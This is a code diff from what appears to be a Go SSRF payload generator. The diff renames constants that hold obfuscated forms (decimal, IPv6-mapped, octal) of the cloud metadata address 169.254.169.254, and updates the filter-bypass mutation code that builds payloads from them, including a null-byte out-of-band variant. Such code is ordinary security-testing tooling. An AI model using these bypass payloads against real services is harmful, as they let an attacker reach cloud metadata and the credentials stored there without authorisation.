@@ -37,9 +37,9 @@ const (
 )
 
 const (
-	metadataDecimalIP     = "2852039166"               // 169.254.169.254
-	metadataIPv6MappedIP  = "[::ffff:169.254.169.254]" // 169.254.169.254
-	metadataOctalDottedIP = "0251.0376.0251.0376"      // 169.254.169.254
+	metadataIPAsDecimal     = "2852039166"               // 169.254.169.254
+	metadataIPv6MappedIP    = "[::ffff:169.254.169.254]" // 169.254.169.254
+	metadataIPAsOctalDotted = "0251.0376.0251.0376"      // 169.254.169.254
 )
 
 // GeneratePayloads builds a context-aware payload set.
@@ -147,7 +147,7 @@ func applyBypassMutations(in []Payload, strategies []MutationStrategy) []Payload
 		for _, s := range strategies {
 			switch s {
 			case DecimalIP:
-				mutated = append(mutated, Payload{Name: p.Name + "-decimal-ip", Category: p.Category, Value: "http://" + metadataDecimalIP + "/"})
+				mutated = append(mutated, Payload{Name: p.Name + "-decimal-ip", Category: p.Category, Value: "http://" + metadataIPAsDecimal + "/"})
 			case IPv6Mapped:
 				mutated = append(mutated, Payload{Name: p.Name + "-ipv6-mapped", Category: p.Category, Value: "http://" + metadataIPv6MappedIP + "/"})
 			case CaseMutation:
@@ -157,7 +157,7 @@ func applyBypassMutations(in []Payload, strategies []MutationStrategy) []Payload
 			case NullByteAppend:
 				mutated = append(mutated, Payload{Name: p.Name + "-nullbyte", Category: p.Category, Value: "http://{{OOB}}%00.example.com/"})
 			case OctalIP:
-				mutated = append(mutated, Payload{Name: p.Name + "-octal-ip", Category: p.Category, Value: "http://" + metadataOctalDottedIP + "/"})
+				mutated = append(mutated, Payload{Name: p.Name + "-octal-ip", Category: p.Category, Value: "http://" + metadataIPAsOctalDotted + "/"})
 			}
 		}
 	}
